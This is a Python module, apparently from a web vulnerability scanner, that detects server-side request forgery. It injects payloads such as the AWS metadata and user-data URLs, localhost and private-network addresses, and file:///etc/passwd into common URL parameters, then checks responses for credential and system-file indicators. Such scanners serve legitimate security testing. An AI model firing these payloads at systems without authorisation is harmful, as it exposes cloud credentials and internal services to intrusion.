SSRF_PAYLOADS = [
    {"name": "aws_metadata", "value": "http://169.254.169.254/latest/meta-data/"},
    {"name": "aws_userdata", "value": "http://169.254.169.254/latest/user-data/"},
    {"name": "localhost_80", "value": "http://127.0.0.1:80"},
    {"name": "localhost_443", "value": "http://127.0.0.1:443"},
    {"name": "localhost_22", "value": "http://127.0.0.1:22"},
    {"name": "localhost_3306", "value": "http://127.0.0.1:3306"},
    {"name": "localhost_http", "value": "http://localhost:80"},
    {"name": "ipv6_local", "value": "http://[::1]:80"},
    {"name": "rfc1918_10", "value": "http://10.0.0.1"},
    {"name": "rfc1918_172", "value": "http://172.16.0.1"},
    {"name": "rfc1918_192", "value": "http://192.168.1.1"},
    {"name": "file_passwd", "value": "file:///etc/passwd"},
    {"name": "file_hosts", "value": "file:///etc/hosts"},
]

SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "destination",
    "file", "load", "read", "include", "page", "document",
    "folder", "root", "image", "img", "data", "link", "href",
    "src", "target", "endpoint", "callback", "webhook", "next",
    "proxy",
]

SSRF_INDICATORS = [
    "root:", "uid=", "meta-data", "ami-id",
    "public-keys", "security-credentials",
    "localhost", "127.0.0.1",
]


def ssrf_check(engine):
    engine._log("INFO", f"Starting SSRF detection on {engine.target_url}")
    results = []

    params = engine.extract_params()
    if not params:
        engine._log("WARN", "No parameters found for SSRF testing")
        return results

    for param in params:
        baseline_text = engine.get_baseline_text(param)
        if baseline_text is None:
            continue

        for entry in SSRF_PAYLOADS:
            args = engine.build_request_args(param, entry["value"])
            resp = engine.request(**args)
            if resp is None:
                continue

            resp_text = resp.text.lower()
            indicators = [i for i in SSRF_INDICATORS if i.lower() in resp_text]

            if indicators:
                baseline_hits = [i for i in SSRF_INDICATORS if baseline_text and i.lower() in baseline_text]
                new_hits = [i for i in indicators if i not in baseline_hits]
                if new_hits:
                    engine._log("VULN", f"SSRF confirmed in '{param}' via {entry['name']}")
                    engine._log("VULN", f"  Indicators (not in baseline): {new_hits}")
                    results.append({
                        "parameter": param,
                        "payload_type": entry["name"],
                        "payload": entry["value"],
                        "indicators": new_hits,
                        "status": resp.status_code,
                        "size": len(resp.content),
                    })
                    break

    engine.results["ssrf"] = results
    engine._log("INFO", f"SSRF detection complete. Confirmed: {len(results)}.")
    return results
